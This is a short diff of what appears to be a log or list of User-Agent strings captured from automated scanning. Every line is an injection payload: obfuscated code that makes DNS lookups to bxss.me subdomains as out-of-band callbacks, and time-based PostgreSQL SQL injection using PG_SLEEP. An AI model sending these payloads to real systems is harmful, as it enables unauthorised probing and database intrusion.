@@ -1412,3 +1412,6 @@ geth(ostbyname(lc('hitsv'.'lykbsoln50fe2.bxss.me.')).'A'.chr(67).chr(hex('58')).
 '.gethostbyname(lc('hitav'.'wzelfxqbb79b3.bxss.me.').'A'.chr(67).chr(hex('58')).chr(108).chr(86).chr(121).chr(80).')
 '+'A'.concat(70-3.concat(22*4).concat(110).concat(88).concat(119).concat(78)+(require'socket' Socket.gethostbyname('hitwh'+'qfalmemb75623.bxss.me.')[3].to_s)+')
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36W9JjNxHX') OR 914=(SELECT 914 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.368LlY0eNA') OR 832=(SELECT 832 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36KyybcT5U' OR 495=(SELECT 495 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36QIx8B3K9')) OR 341=(SELECT 341 FROM PG_SLEEP(15))--)
